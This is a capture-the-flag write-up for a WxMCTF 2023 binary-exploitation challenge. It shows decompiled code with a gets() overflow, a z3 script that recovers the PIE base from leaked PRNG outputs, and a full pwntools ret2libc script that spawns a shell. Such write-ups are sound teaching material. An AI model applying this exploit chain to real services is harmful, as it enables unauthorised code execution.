# Toady's Anger Challenge

> Welcome to professor Toady's math class!
> 
> Today, we've got a special guest, who has created a program to guesstimate your course's mark!
>
> nc toady.nyiyui.ca 2002

## RE-ing the binary

As we can see, the program starts off by saving the upper and lower 32 bits of the address of `menu()` into global variables `a` and `b` respectively.

```c
uint32_t a = 0;
uint32_t b = 0;

int main()
{
  uint64_t ptr;

  // unbuffer our input
  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);

  ptr = menu;
  a = v3 >> 32;     // a is the upper 32 bits of menu address
  b = v3;           // b is the lower 32 bits of menu address
  return menu();
}
```

Looking into menu,

```c
int menu()
{
  unsigned int next_guess_1;
  unsigned int next_guess_2;
  int result;
  unsigned int opt;
  char buf[32];

  for ( opt = 0; opt != 4; result = opt )
  {
    puts("THE MARK MACHINE");
    printf("1. Guesstimate your mark\n2. Get your student number\n3. Enter Feedback\n4. Exit\nEnter here: ");
    scanf("%i", &opt);
    if ( opt == 1 )
    {
      next_guess_1 = next();
      printf("Your mark is: %i\n", next_guess_1 % 0x31);
    }
    if ( opt == 2 )
    {
      next_guess_2 = next();
      printf("Your student number is: %08x\n", next_guess_2);
    }
    if ( opt == 3 )
    {
      puts("We totally value your feedback!\nPlease enter it here for our great team of shredders to attend to it!");
      getchar();
      gets(buf);
    }
  }
  return result;
}
```

we can see that there is an obvious buffer overflow in option 3 of the menu.

However, if we look at the security of the binary,

```
[*] '/WxMCTF 2023/pwn/Toady Anger Challenge/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We see that PIE is enabled, leaving us with nothing much to exploit despite our buffer overflow.

## Solving the Crypto

If we then look into the `next()` function,

```
uint64_t next()
{
  a ^= 14 * a;
  a ^= b;
  b = 62555385 * b + 17;
  return (unsigned int)a;
}
```

We see that it actually return numbers based off the address of `menu()` which was the initial values of `a` and `b`.

Thus when we use option 1 and 2, we can see the numbers returned as some form of PIE leak, and we simply have to do some calculations to find the initial address of `menu` and defeat PIE, allowing us to easily exploit our buffer overflow and get a shell.

Being the lazy person that I am, the address to `menu()` can be recovered by simply running the `next()` function X number of times and throwing it into a **SAT solver** (z3) to recover the original address of `menu()`.

```python
from pwn import *
import z3

p = process("./vuln")

s = z3.Solver()
a = z3.BitVec('a', 32)
b = z3.BitVec('b', 32)
orig_a, orig_b = (a, b)

for i in range(5):
    p.sendlineafter(b"here: ", b"2")
    p.recvuntil(b"number is: ")
    leak = int(p.recvline().strip(), 16)
    a ^= 14 * a;
    a ^= b;
    b = 62555385 * b + 17
    s.add(a == leak)

s.check()
m = s.model()
a = m[orig_a].as_long()
b = m[orig_b].as_long()
menu = (a << 32) | b

log.success(f"addr of menu @ {hex(menu)}")

p.interactive()

"""
OUTPUT:

[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 3597
[+] addr of menu @ 0x5580f079c239
THE MARK MACHINE
1. Guesstimate your mark
2. Get your student number
3. Enter Feedback
4. Exit
Enter here:
"""
```


## Solving the PWN

Now that we have defeated PIE, the remainder of the exploit is trivial. It is a simple `ret2libc` to call `system('/bin/sh')`. Remember to patch the binary with the given LIBC and LD _(which you have to source yourself or use pwninit to fetch)_, either via `pwninit` or `patchelf`.

The solve script is self-explanatory

```python
from pwn import *
import z3

context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
p = process("./vuln")

s = z3.Solver()
a = z3.BitVec('a', 32)
b = z3.BitVec('b', 32)
orig_a, orig_b = (a, b)

for i in range(5):
    p.sendlineafter(b"here: ", b"2")
    p.recvuntil(b"number is: ")
    leak = int(p.recvline().strip(), 16)
    a ^= 14 * a
    a ^= b
    b = 62555385 * b + 17
    s.add(a == leak)

s.check()
m = s.model()
a = m[orig_a].as_long()
b = m[orig_b].as_long()
menu = (a << 32) | b

elf.address = menu - elf.sym.main + 230

log.success(f"addr of menu @ {hex(menu)}")
log.success(f"addr of elf @ {hex(elf.address)}")

# stage 1 payload: leak LIBC address
r = ROP(elf)
r.puts(elf.got.puts)
r.main()

p.sendlineafter(b"here: ", b"3")
p.sendline(b"A" * 0x28 + r.chain())
p.sendlineafter(b"here: ", b"4")

libc_leak = unpack(p.recvline().strip(b'\n'), 'all')
libc.address = libc_leak - libc.sym.puts

log.success(f"addr of puts @ {hex(libc_leak)}")
log.success(f"addr of libc @ {hex(libc.address)}")

# stage 2 payload: call system('/bin/sh')
r = ROP(libc)
r.call(r.ret)
r.system(next(libc.search(b'/bin/sh')))

p.sendlineafter(b"here: ", b"3")
p.sendline(b"A" * 0x28 + r.chain())
p.sendlineafter(b"here: ", b"4")

p.interactive()
```

